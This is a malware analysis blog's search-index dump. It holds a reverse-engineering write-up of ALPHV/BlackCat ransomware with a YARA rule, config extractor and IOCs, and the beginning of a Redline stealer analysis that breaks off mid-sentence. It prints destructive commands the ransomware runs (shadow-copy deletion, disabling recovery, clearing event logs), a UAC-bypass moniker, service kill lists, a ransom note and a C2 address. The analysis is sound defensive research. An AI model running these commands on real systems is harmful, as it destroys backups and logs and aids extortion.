[{"categories":["Malware Analysis"],"content":"ALPHV ransomware analysis","date":"2023-09-12","objectID":"/alphv/","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Introduction ALPHV/Blackcat is a ransomware family that uses Ransomware-as-a-service (RaaS) business model. The ransomware is written in Rust Programming language. It is highly configurable using embedded configurations or provided as command line arguments. The malware family has Windows, Linux and ESXi versions. The malware uses AES or ChaCha20 to encrypt the files and delete the volume shadow copies to decrease the possibility of any data survival. It also kills predefined set of services and Processes related to Anti-malware products, Virtualization software and other business-related and backup software. The following graph represents the attack flow of the ransomware. ","date":"2023-09-12","objectID":"/alphv/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Analysis ","date":"2023-09-12","objectID":"/alphv/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Identifying the sample. The sample was identified by Detect It Easy to be compiled with mingw , this should be some native application. But when I looked at the strings, I knew that it was Rust compiled malware. Opening the sample in IDA will take some time to do the analysis. Rust binaries are not easy to reverse, especially with stripped -release- binaries. It is statically linked so it is expected to have so many functions and most of them are library and crate functions. Another issue is the strings (all the type system actually), the strings are stored in a structure containing a pointer to the string, length, and capacity. struct String { DWORD length; DWORD buff; DWORD capacity; }; The string itself is not null-terminated string so the strings will be mixed. one way to identify the right string is to change the target region to raw data and select the start of the string to the next Xref , this is the termination of the string (Not working all the time). There are a lot of strange things related to types in rust but will be explained as we move on (if I had to). Another thing to keep in mind is that there will be a lot of function calls related to error checking and memory safety related to Rust so, I will try to avoid wasting too much time to recognize them. Now we could start, First The main function should be found. The main function will not be clear as in native binaries for example. The start or main function identified by IDA has a lot of unrelated functions to do the initializations and the checks that Rust compiler did (like CRT initializations). The main function is passed to another function, called lang_start . Originally, the function’s addresses are user_main: 0x0047B1F0 and lang_start: 0x0049BD80. lang_start just call the user main function stored in ecx . user_main also just transfers the execution to sub_48F3C0. Before going into the assembly to see what this does, I looked at strings for a while and got some interesting findings. /rustc/532d2b14c05f9bc20b2d27cbb5f4550d28343a36\\library\\core\\src\\ that string contains the commit hash for the rust version. The rust version used is rustc 1.59.0. it was out in 2021 (nighty version) this could give us a hint about the period of the malware operation. Configuration of the ransomware. The important thing is the extension: kh1ftzx field. A quick google search reveals the ransomware family is ALPHV/BlackCat Ransomware. ","date":"2023-09-12","objectID":"/alphv/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Ransomware running options. Trying to run the sample. It has a sub-command --access-token which does nothing. Running the sample with any random token will work. ","date":"2023-09-12","objectID":"/alphv/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Command Line and Configuration Parsing Back to user_main , the function calls sub_47DF80 which calls sub_5DFA10. sub_5DFA10 is used to get the Command line used, using GetCommandLineW. Then it parses the command line string. it extracts the subcommand passed, --access-token was tested and seems like it did nothing with it. Out of this function, back to the previous one sub_47DF80, it continues to parse the Command line checking for -h or --help presence to print the help menu. The help menu is displayed by using the console of the currently running process so in case of using a debugger, AttachConsole argument dwProcessId should be edited to another console process (CMD). It then loads the hardcoded configurations (Config extractor code at the end of the report) as follows: { \"config_id\": \"\", \"public_key\": \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq8kj5LQJngPsY7AhTaJsUXc5FrSGeKS5gw5PIqk2QPM9TY6+us8TRRzWZ7rGk1zns2klpzpRMUzLIqB8lpCkJjqkOUGfgqs+HN4VIOpoJgFY897xstJCxTc+8pYQEsSqClxJllscU0okkLSQqndIR2Gznlg3qfcwyncJAFBInyqM+L4kbwCQZ6x5HNiLe2lJn8RP2aDiMI+RS1uLYron2G7rxDTUQnxThMtgLAeko8ulaB3TpB0g4lmHCenkEZeBNs81986+MjHnv7KkiscZ7ZrezKjNaIxRs8BAcD9y+Q9QQxCvZMS01ITNXcgiItbA4dsGq1fPJ42yBkkiIodsEQIDAQAB\", \"extension\": \"kh1ftzx\", \"note_file_name\": \"RECOVER-${EXTENSION}-FILES.txt\", \"note_full_text\": \"\u003e\u003e What happened?\\n\\nImportant files on your network was ENCRYPTED and now they have \\\"${EXTENSION}\\\" extension.\\nIn order to recover your files you need to follow instructions below.\\n\\n\u003e\u003e Sensitive Data\\n\\nSensitive data on your system was DOWNLOADED.\\nIf you DON'T WANT your sensitive data to be PUBLISHED you have to act quickly.\\n\\nData includes:\\n- Employees personal data, CVs, DL, SSN.\\n- Complete network map including credentials for local and remote services.\\n- Private financial information including: clients data, bills, budgets, annual reports, bank statements.\\n- Manufacturing documents including: datagrams, schemas, drawings in solidworks format\\n- And more...\\n\\n\u003e\u003e CAUTION\\n\\nDO NOT MODIFY ENCRYPTED FILES YOURSELF.\\nDO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.\\nYOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.\\n\\n\u003e\u003e What should I do next?\\n\\nFollow these simple steps to get everything back to normal:\\n1) Download and install Tor Browser from: https://torproject.org/\\n2) Navigate to: http://rfosusl6qdm4zhoqbqnjxaloprld2qz35u77h4aap46rhwkouejsooqd.onion/?access-key=${ACCESS_KEY}\", \"note_short_text\": \"Important files on your network was DOWNLOADED and ENCRYPTED.\\nSee \\\"${NOTE_FILE_NAME}\\\" file to get further instructions.\", \"default_file_mode\": \"Auto\", \"default_file_cipher\": \"Best\", \"credentials\": [], \"kill_services\": [ \"mepocs\", \"memtas\", \"veeam\", \"svc$\", \"backup\", \"sql\", \"vss\", \"msexchange\", \"sql$\", \"mysql\", \"mysql$\", \"sophos\", \"MSExchange\", \"MSExchange$\", \"WSBExchange\", \"PDVFSService\", \"BackupExecVSSProvider\", \"BackupExecAgentAccelerator\", \"BackupExecAgentBrowser\", \"BackupExecDiveciMediaService\", \"BackupExecJobEngine\", \"BackupExecManagementService\", \"BackupExecRPCService\", \"GxBlr\", \"GxVss\", \"GxClMgrS\", \"GxCVD\", \"GxCIMgr\", \"GXMMM\", \"GxVssHWProv\", \"GxFWD\", \"SAPService\", \"SAP\", \"SAP$\", \"SAPD$\", \"SAPHostControl\", \"SAPHostExec\", \"QBCFMonitorService\", \"QBDBMgrN\", \"QBIDPService\", \"AcronisAgent\", \"VeeamNFSSvc\", \"VeeamDeploymentService\", \"VeeamTransportSvc\", \"MVArmor\", \"MVarmor64\", \"VSNAPVSS\", \"AcrSch2Svc\" ], \"kill_processes\": [ \"agntsvc\", \"dbeng50\", \"dbsnmp\", \"encsvc\", \"excel\", \"firefox\", \"infopath\", \"isqlplussvc\", \"msaccess\", \"mspub\", \"mydesktopqos\", \"mydesktopservice\", \"notepad\", \"ocautoupds\", \"ocomm\", \"ocssd\", \"onenote\", \"oracle\", \"outlook\", \"powerpnt\", \"sqbcoreservice\", \"sql\", \"steam\", \"synctime\", \"tbirdconfig\", \"thebat\", \"thunderbird\", \"visio\", \"winword\", \"wordpad\", \"xfssvccon\", \"*sql*\", \"bedbh\", \"vxmon\", \"benetns\", \"bengien\", \"pvlsvr\", \"beserver\", \"raw_agent_svc\", \"vsnapvss\", \"CagService\", \"QBIDPService\", \"QBDBMgrN\", \"QBCFMonitorService\", \"SAP\", \"TeamViewer_Service\", \"TeamViewer\", \"tv_w32\", \"tv_x64\", \"CVMoun","date":"2023-09-12","objectID":"/alphv/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Debugging issues The sample broke and didn’t continue in debugger even if the command line edited, but it works in usual CMD. So, to use the debugger we need something to delay execution to attach the debugger in early code. I patched the code and added a call to sleep function followed by INT 3 to instruction (Not shown in screenshot) to make it crash and put a breakpoint in any following instruction and NOP INT3 to continue :). ","date":"2023-09-12","objectID":"/alphv/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Preparing the environment The malware retrieves MachineGuid from the registry sub-key SOFTWARE\\\\Microsoft\\\\Cryptography by opening the sub-key and then retrieves the value MachineGuid using RegQueryValueExW There is no such key in my machine, so it fails to read but anyway it continues. The next step is to execute WMIC command wmic csproduct get UUID But first it should open CMD. It searches for cmd.exe in the current working directory. If not found in the current directory, it searches for it in system32 After finding the target executable, the following command is executed. The UUID will be used later to generate access key value to be used to access the malware website on the darknet. \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic csproduct get UUID\" The malware then Get a handle to a virtual file \\\\?\\nul , I’m not sure but this could be used to redirect any messages to no place. Then, the malware creates a named pipe \\\\\\\\.\\\\pipe\\\\rust_anonymous_pipe1.\u003cPID\u003e.\u003cRandomValue\u003e to be used in communication in standard OUT (-11)/ERR (-12). The pipe open mode is PIPE_ACCESS_INBOUND|FILE_FLAG_OVERLAPPED|FILE_FLAG_FIRST_PIPE_INSTANCE The pipe has access to read, write, and connect operations. and reject remote clients (PIPE_REJECT_REMOTE_CLIENTS). All the handles to the created named pipes. Finally, it is called CreateProcessW to create CMD process. The created process will be hidden as the flags passed are CREATE_NO_WINDOW|CREATE_PROTECTED_PROCESS. To receive the return value, WaitForMultipleObjects is used to wait for a previously created events (2 events) then, it reads the output from the previously created pipe. ","date":"2023-09-12","objectID":"/alphv/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Gather victim info. The malware creates some other thread to execute another code section (function at address 0x005EFAA0). It calls GetSystemInfo to obtain some information about the victim. (_SYSTEM_INFO struct in the memory dump). It Also Call ntdll.ZwQueryInformationProcess with ProcessInformationClass=0x0 to get the PEB structure of the currently running process. It then calls ReadProcessMemory again to read LDR Structure. Also, it gets uses the same function to get the full path to the currently running executable. ","date":"2023-09-12","objectID":"/alphv/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Privilege Escalation (UAC Bypass) The malware uses COM moniker to bypass UAC and elevate its privileges. First it calls CoInitializeEx to initialize the COM library. it then uses CLSID = {3E5FC7F9-9A51-4367-9063-A120244FBEC7} which is CMSTPLUA is a COM interface prone to UAC bypass; To call another function that calls CoGetObject . it makes the string Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} to elevate the privileges and bypass UAC. After that, it uninitialized the COM object by calling CoUninitialize **** According to sophos’ lockbit 3 blog this should left a trace in the registry Key Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration the following value. C:\\WINDOWS\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} But I couldn’t find it on my machine. ","date":"2023-09-12","objectID":"/alphv/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"More preparation: elevated Child process to continue The malware spawns another elevated process that continues execution. After that, it adds a registry key using reg add command. And use the previously mentioned way of executing CMD. The registry key is used to edit the MaxMpxCt member to increase the maximum number of outstanding client requests. the following command is executed. \"C:\\Windows\\system32\\cmd.exe\" /c \"reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f In the same (previous) screenshot we see a usage of fsutil utility in windows that can deal with the windows file system. The commands executed are : fsutil behavior set SymlinkEvaluation R2R:1 fsutil behavior set SymlinkEvaluation R2L:1 These commands will be executed to set symbolic links to enable: Remote to Remote Symbolic links Remote to Local symbolic links Another command is executed to get the entries of the ARP table. Then, it tries to reset IIS service by using iisreset.exe /stop . ","date":"2023-09-12","objectID":"/alphv/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Delete Shadow Copies To make sure that all the data are deleted/Encrypted, The malware then deletes all the shadow copies using vssadmin utility. The following are the arguments to CreateProcessW The command executed is: \"C:\\Windows\\system32\\cmd.exe\" /c \"vssadmin.exe Delete Shadows /all /quiet\" Then, it uses wmic utility to delete the shadow copies again. The command executed is: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic.exe Shadowcopy Delete\" Next, it modifies the Bootloader default to disable recovery mode using bcdedit utility. It runs two instances of the command line. The first was not complete so it returns an error message. The second is the following. And it runs successfully: The command executed is: \"C:\\Windows\\system32\\cmd.exe\" /c \"bcdedit /set {default} recoveryenabled No\" ","date":"2023-09-12","objectID":"/alphv/:2:9","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Delete Event logs. Then, it runs the following script: \"C:\\Windows\\system32\\cmd.exe\" /c \"cmd.exe /c for /F \\\"tokens=*\\\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \\\"%1\\\"\" This script is used to clear the Event logs entries. It gets all the event logs using wevtutil.exe el and uses wevtutil.exe cl to clear them. ","date":"2023-09-12","objectID":"/alphv/:2:10","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Kill Targeted Services \u0026 Processes Then it is called Global\\SvcctrlStartEvent_A3752DX and OpenScManagerW ****according to google, this is used to duplicate windows services. Then it uses EnumServicesStatusExW to list all the services and then kills the services specified in the kill_services in the configurations. For every service, it runs a loop to compare against every entry in the saved kill_services . The targeted services to kill are: \"mepocs\", \"memtas\", \"veeam\", \"svc$\", \"backup\", \"sql\", \"vss\", \"msexchange\", \"sql$\", \"mysql\", \"mysql$\", \"sophos\", \"MSExchange\", \"MSExchange$\", \"WSBExchange\", \"PDVFSService\", \"BackupExecVSSProvider\", \"BackupExecAgentAccelerator\", \"BackupExecAgentBrowser\", \"BackupExecDiveciMediaService\", \"BackupExecJobEngine\", \"BackupExecManagementService\", \"BackupExecRPCService\", \"GxBlr\", \"GxVss\", \"GxClMgrS\", \"GxCVD\", \"GxCIMgr\", \"GXMMM\", \"GxVssHWProv\", \"GxFWD\", \"SAPService\", \"SAP\", \"SAP$\", \"SAPD$\", \"SAPHostControl\", \"SAPHostExec\", \"QBCFMonitorService\", \"QBDBMgrN\", \"QBIDPService\", \"AcronisAgent\", \"VeeamNFSSvc\", \"VeeamDeploymentService\", \"VeeamTransportSvc\", \"MVArmor\", \"MVarmor64\", \"VSNAPVSS\", \"AcrSch2Svc\" Same as kill_services , it searches for any running process that included in kill_processes . It gets a list of the currently running processes using CreateToolhelp32Snapshot and iterate through the snapshot using Process32FirstW and Process32NextW The targeted Processes are: \"agntsvc\", \"dbeng50\", \"dbsnmp\", \"encsvc\", \"excel\", \"firefox\", \"infopath\", \"isqlplussvc\", \"msaccess\", \"mspub\", \"mydesktopqos\", \"mydesktopservice\", \"notepad\", \"ocautoupds\", \"ocomm\", \"ocssd\", \"onenote\", \"oracle\", \"outlook\", \"powerpnt\", \"sqbcoreservice\", \"sql\", \"steam\", \"synctime\", \"tbirdconfig\", \"thebat\", \"thunderbird\", \"visio\", \"winword\", \"wordpad\", \"xfssvccon\", \"*sql*\", \"bedbh\", \"vxmon\", \"benetns\", \"bengien\", \"pvlsvr\", \"beserver\", \"raw_agent_svc\", \"vsnapvss\", \"CagService\", \"QBIDPService\", \"QBDBMgrN\", \"QBCFMonitorService\", \"SAP\", \"TeamViewer_Service\", \"TeamViewer\", \"tv_w32\", \"tv_x64\", \"CVMountd\", \"cvd\", \"cvfwd\", \"CVODS\", \"saphostexec\", \"saposcol\", \"sapstartsrv\", \"avagent\", \"avscc\", \"DellSystemDetect\", \"EnterpriseClient\", \"VeeamNFSSvc\", \"VeeamTransportSvc\", \"VeeamDeploymentSvc\" The malware lists all the available servers using NetServerEnum to display all the servers on the verbose screen. It Also retrieves the computer name using GetComputerNameW , it will be used in the verbose output. The next thing it did was to prepare the ransom note file and the image. It dropped on the desktop first before any encryption. Then, while encrypting the files, it will be dropped in every directory. ","date":"2023-09-12","objectID":"/alphv/:2:11","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Encryption Mechanism The malware then looks for a specific locations like previous search queries in C:\\Users\\\u003cUSER\u003e\\Searches\\Everywhere.search-ms and drops the malware note there too (before encrypting). it makes three files in the search directory: The ransom note. checkpoints-Everywhere.search-ms.kh1ftzx that contain a number. Everywhere.search-ms.kh1ftzx that will be encrypted. The malware then prepares a configuration data that describes the file being encrypted and it includes encryption mode, the encryption algorithm (chacha20 and AES) and the private key …. {\"version\":0,\"mode\":\"Full\",\"cipher\":\"Aes\",\"private_key\":[86,60,83,123,105,227,184,242,209,255,43,42,116,235,123,117],\"data_size\":248,\"chunk_size\":25362816,\"finished\":false} The Encryption algorithm used is AES. The previous one was for Everywhere.search-ms.kh1ftzx. and the key is randomly generated. The JSON data are used to represent the file and its generated key. The encryption process starts with adjusting the file pointer to the beginning of the file using SetFilePointerEx Then, it uses WriteFile to over-write the content. The writing is by appending data (4-bytes then a bigger chunk then the first 4-bytes again) to the end of the file and repeat the process This picture shows the original data (First 0xF8 bytes) delimited by 4-bytes followed by RSA encrypted data (0x100) that contain the JSON data -with AES key- and 4-bytes (00 00 01 00) that was copied before the encrypted text followed by the same 4-bytes delimiter. the first bytes would be then encrypted using AES and the random generated key. The malware then get a handle to multiple files and read the first 4-bytes of the data. It goes through all the folder under C:\\users\\\u003cuser\u003e and repeat the process. This is done first to the USER directory. Then it uses some Win32 API GetLogicalDrives to get all the available disk drives. Then, it goes through all the drives using FindFirstVolumeW and FindNextVolumeW . The malware has a list of all the Drive letters. here is a small snippet. for the found drive, it then uses GetVolumePathNameW to get the path to the mount point of the drive. If there is no path to it, it mount it to the system to encrypt it. And for every directory, it uses FindFirstFileW and FindNextFileW to get all the files. The encryption process described for Everywhere.search-ms is applied for all files. It first create a file with the original file name and checkpoint added to the beginning and the ransomware extension. Then, it generates an AES key to be used to encrypt the file and add it to the JSON data. The JSON data is then encrypted using RSA public key provided in the sample data. The RSA encrypted data are delimited by 4-bytes value = 19 47 B3 01. The original file data is then encrypted using AES cipher and the encrypted data is written back. There are some exclusion paths and file extensions that will not be encrypted. these exclusions are defined in the configurations of the Ransomware. Example of encrypted file containing the mentioned elements: The last thing is to drop on the desktop background: ","date":"2023-09-12","objectID":"/alphv/:2:12","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Config Extractor import json import argparse import yara rule = ''' rule alphv_blackcat_config_extractor{ strings: $a1 = {7b 22 63 6f 6e 66 69 67 5f 69 64 22} // {\"config_id\" condition: $a1 } ''' end_rule = ''' rule end_delimiter{ strings: $a1 = {7D 20 20 20 20 20} // }\\x20\\x20\\x20\\x20\\x20 condition: $a1 } ''' def get_config(file, start,end): config = '' try: with open(file, 'rb') as f: data = f.read() config = data[start:end+1].decode('utf-8') return config except Exception as e: print('Error: {}'.format(e)) exit(1) def print_config(config): try: config_json = json.loads(config) config_json = json.dumps(config_json, indent=4) print('Config:') print('-'*40) print(config_json) except Exception as e: print('Invalid JSON. Error: {}'.format(e)) print('Config:') print('-'*20) print(config) def main(): parser = argparse.ArgumentParser(description='ALPHV/Blackcat ransomware config extractor') parser.add_argument('-f', '--file', help='Path to the PE file', required=True) args = parser.parse_args() try: compiled_rule = yara.compile(source=rule) matches = compiled_rule.match(args.file) start = matches[0].strings[0][0] compiled_end = yara.compile(source=end_rule) matches_end = compiled_end.match(args.file) for end_match in matches_end[0].strings: # print(start) # print(end_match[0]) if end_match[0] \u003e start: # print(end_match[0]) config = get_config(args.file,start, end_match[0]) print_config(config) return except Exception as e: print(\"No matches found\") print('Error: {}'.format(e)) exit(1) if __name__ == '__main__': main() Usage: ","date":"2023-09-12","objectID":"/alphv/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"YARA rule ALPHV_BlackCat_Ransomware { meta: malware = \"ALPHV/BlackCat Ransomware\" hash = \"ecea6b772742758a2240898ef772ca11aa9d870aec711cffab8994c23044117c\" author = \"d01a\" description = \"detect ALPHV/BlackCat Ransomware\" strings: $alphv1 = \"No Access Token Provided\" ascii $alphv2 = \"locker::core::os::windows\" ascii $alphv3 = \"locker::core::pipeline\" ascii $alphv4 = \"\\\\\\\\.\\\\pipe\\\\__rust_anonymous_pipe1__.\" ascii $alphv5 = \"src/bin/encrypt_app/app.rs\" ascii $alphv6 = \"src/core/os/windows/privilege_escalation.rs\" ascii $alphv7 = \"rc/bin/encrypt_app/windows.rs\" ascii $alphv8 = \"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\" ascii $alphv9 = \"bcdedit /set {default} recoveryenabled No\" ascii $alphv10 = \"vssadmin.exe Delete Shadows /all /quiet\" ascii $alphv11 = \"wmic.exe Shadowcopy Delete\" ascii $alphv12 = \"wmic csproduct get UUID\" ascii condition: uint16(0) == 0x5A4D and (uint32(uint32(0x3C)) == 0x00004550) and 7 of them } Hybrid-analysis search result Free Automated Malware Analysis Service - powered by Falcon Sandbox - Search results from HA Community Files (hybrid-analysis.com) ","date":"2023-09-12","objectID":"/alphv/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"IOCs IOC Description ecea6b772742758a2240898ef772ca11aa9d870aec711cffab8994c23044117c ALPHV sha256 checksum wmic csproduct get UUID WMIC command vssadmin.exe Delete Shadows /all /quiet command to delete shadow copies wmic.exe Shadowcopy Delete command to delete shadow copies bcdedit /set {default} wrong command used bcdedit /set {default} recoveryenabled No command to disable recovery cmd.exe /c for /F \"tokens=*\" %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl \"%1\" CMD loop to delete event logs fsutil behavior set SymlinkEvaluation R2R:1 change filesystem symbolic links fsutil behavior set SymlinkEvaluation R2L:1 change filesystem symbolic links iisreset.exe /stop command to reset IIS service arp -a command to get the ARP table \\.\\pipe\\rust_anonymous_pipe1.. named piped schema used \\?\\nul virtual file used {3E5FC7F9-9A51-4367-9063-A120244FBEC7} CLSID used to bypass UAC reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f command to edit lanman server speed SOFTWARE\\Microsoft\\Cryptography\\MachineGuid quired registry key checkpoints-\u003cOriginal_Filename\u003e.kh1ftzx ransomware-created file RECOVER-kh1ftzx-FILES.txt.png ransom note wallpaper RECOVER-kh1ftzx-FILES.txt the ransom notes src/bin/encrypt_app/app.rs malware source code file name src/core/os/windows/privilege_escalation.rs malware source code file name src/core/os/windows/samba.rs malware source code file name src/core/os/windows/system_info.rs malware source code file name rc/bin/encrypt_app/windows.rs malware source code file name ","date":"2023-09-12","objectID":"/alphv/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"MITRE ATT\u0026CK Execution https://attack.mitre.org/techniques/T1059/003 Command and Scripting Interpreter: Windows Command Shell https://attack.mitre.org/techniques/T1047/ Windows Management Instrumentation Privilege Escalation https://attack.mitre.org/techniques/T1548/002/ Abuse Elevation Control Mechanism: Bypass User Account Control https://attack.mitre.org/techniques/T1055/ Process Injection Defense Evasion https://attack.mitre.org/techniques/T1548/002/ Abuse Elevation Control Mechanism: Bypass User Account Control https://attack.mitre.org/techniques/T1222/001/ File and Directory Permissions Modification: Windows File and Directory Permissions Modification https://attack.mitre.org/techniques/T1112/ Modify Registry https://attack.mitre.org/techniques/T1562/001/ Impair Defenses: Disable or Modify Tools https://attack.mitre.org/techniques/T1070/001/ Indicator Removal: Clear Windows Event Logs https://attack.mitre.org/techniques/T1070/004/ Indicator Removal: File Deletion Discovery https://attack.mitre.org/techniques/T1083 File and Directory Discovery https://attack.mitre.org/techniques/T1135/ Network Share Discovery https://attack.mitre.org/techniques/T1069/002/ Permission Groups Discovery: Domain Groups https://attack.mitre.org/techniques/T1057/ Process Discovery https://attack.mitre.org/techniques/T1018/ Remote System Discovery https://attack.mitre.org/techniques/T1033/ System Owner/User Discovery https://attack.mitre.org/techniques/T1007/ System Service Discovery Impact https://attack.mitre.org/techniques/T1485/ Data Destruction https://attack.mitre.org/techniques/T1486/ Data Encrypted for Impact https://attack.mitre.org/techniques/T1490/ Inhibit System Recovery https://attack.mitre.org/techniques/T1489/ Service Stop ","date":"2023-09-12","objectID":"/alphv/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"References https://research.checkpoint.com/2023/rust-binary-analysis-feature-by-feature/ https://www.youtube.com/watch?v=q8irLfXwaFM https://ss64.com/nt/fsutil.html https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware/ https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/ https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/ Microsoft Windows - COM Session Moniker Privilege Escalation (MS17-012) - Windows local Exploit (exploit-db.com) The many lives of BlackCat ransomware | Microsoft Security Blog ","date":"2023-09-12","objectID":"/alphv/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"ALPHV ransomware","uri":"/alphv/"},{"categories":["Malware Analysis"],"content":"Redline stealer analysis","date":"2023-09-12","objectID":"/redline/","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Introduction Redline stealer is one of the most popular info stealers out there. The malware is available for sale on underground forums for a different subscription options. The malware has a large set of stealing modules. It harvests: Victim information (such as hostname, hardware specs, location, and live screenshot) Browser data (such as saved passwords, cookies, and autofill fields) Crypto wallets Telegram data Discord tokens Specific files from the victim machine FTP server credentials Game launcher data (Steam login files) VPN credentials Also, it has a component that can be used as a loader to execute other malware families or download a newer version of the stealer. The attack flow can be represented by the following graph: ","date":"2023-09-12","objectID":"/redline/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Analysis ","date":"2023-09-12","objectID":"/redline/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"Sample Unpacking To get an overview of the sample I’m dealing with, I use Detect It Easy to get some basic information about what the Programming language is used and if there is known Packer/Obfuscator used. The sample is written in .NET and uses a protector .NET Reactor. This is a commercial protector but, in most cases, it is just a generic rule that matches many packers. Opening the sample in dnSpyEx to see what’s going on. There are no strings, and the control flow is not so good. Now I will focus on restoring the strings first. Trying the default options of de4dot gives us the following result. Not too much happened. sill no strings. Now I must get the method that did the string deobfuscation to instrument de4dot to decrypt the strings. I noticed that the method tLZpq04kop takes an integer number. This could be an index of string table. The sample references a resource named F1EpF55XYo6TY0Asiq.kluPYdoAXZXQRoIC8u which consists of some bytes. it Also references RSACryptoServiceProvider.UseMachineKeyStore so it might be used in the string decryption process. without going into details, we know enough to use de4dot to decrypt the strings. Using the following command, I gave de4dot a hint about where the decryption function is. de4dot.exe sample2 --strtyp delegate --strtok 06000133 The result, the strings appeared finally. After spending some time trying to get an idea of what it is trying to do. The sample did some things that did not look malicious. print some Russian sentences, it looks like a game. The sample did not look like it was the final payload, it was a loader that executes the final payload process. I found a noticeably big array that might be the encrypted payload but first I need to verify my assumption. I decided to execute the sample and watch what will happen. The sample Spawns another process and exit. so, my assumption is right -I guess-. Reddish color means exited process. To extract the final payload, I will use https://github.com/hasherezade/hollows_hunter with /loop option to scan the memory all the time. It will detect and extract the injected code. I wanted to verify that it was unpacked right so, I used unpacme and here is the report UnpacMe Results d1fe4cf589c8852fbc60fdcdc39bf944e27ccc2ae634b98ee841d9a9c4c6f55f It Extract 2 child processes, hollows hunter just got one. one of the children is the same as the one extracted with hollows_hunter and the second one is a DLL named RGBCore.dll. ","date":"2023-09-12","objectID":"/redline/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"It is RedLine! After skimming over the functions in dnSpyEx I see some functionality that the thieves should have. So, to make sure that the guess was right and to get the malware family too, I uploaded the sample to VirusTotal. And it immediately triggered a lot of AV vendors because it is the infamous Redline Stealer. By opening the sample in dnSpyEx , the payload is not obfuscated. only the configuration encrypted and will discuss that in a moment. The malware executing a thread to execute empty hidden message box. ","date":"2023-09-12","objectID":"/redline/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Redline stealer","uri":"/redline/"},{"categories":["Malware Analysis"],"content":"C2 server decryption Inside MessageBox.Show method there is an interesting method named StringDecrypt.Decrypt . The method takes two arguments: string b64 and string stringKey . The first argument is the target string and the second is the key to decrypt the string. The decryption method is quite simple it consists of: Decode Base64 string. XOR the decoded string with the Key. Decode the resulting string using Base64. The malware then instantiate EndpointConnection() object to use in connecting to C2 server. It then resolves the C2 server IP address. The configuration of the malware is hardcoded in the EntryPoint class. To get the configuration we can use CyberChef (For now, C2 extractor will be explained \u0026 implemented at the end of the report). The configuration used in this sample: IP = \"46.8.19.196:53773\" ID = \"ytmaloy8\" Message = \"\" Key = \"Pythonic\" If there are multiple C2 IP addresses, they will be separated by | but in this case, only one IP is used. The malware will try to send HTTP request to the IP using 